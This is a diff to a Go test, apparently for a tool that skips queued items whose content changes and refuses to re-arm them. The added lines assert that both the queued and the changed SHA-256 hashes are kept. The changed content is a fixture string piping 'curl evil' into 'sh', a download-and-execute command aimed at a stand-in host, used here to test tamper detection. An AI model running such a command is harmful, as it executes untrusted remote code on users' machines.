@@ -247,6 +247,10 @@ func TestChangedItemIsSkippedAndCannotBeRearmed(t *testing.T) {
 	if got := s.Skipped[0].Meta.SkipReason; got != SkipChanged {
 		t.Errorf("skip reason = %q", got)
 	}
+	// Both hashes are kept: the one it was queued at, and the one it has now.
+	if m := s.Skipped[0].Meta; m.SHA256 != added.SHA256 || m.ChangedSHA256 != SHA256Hex([]byte("echo hi; curl evil | sh\n")) {
+		t.Errorf("hashes = queued %q now %q", m.SHA256, m.ChangedSHA256)
+	}
 	if err := d.Unskip(added.Name); err == nil || !strings.Contains(err.Error(), "cannot be re-armed") {
 		t.Errorf("Unskip = %v, want a refusal", err)
 	}
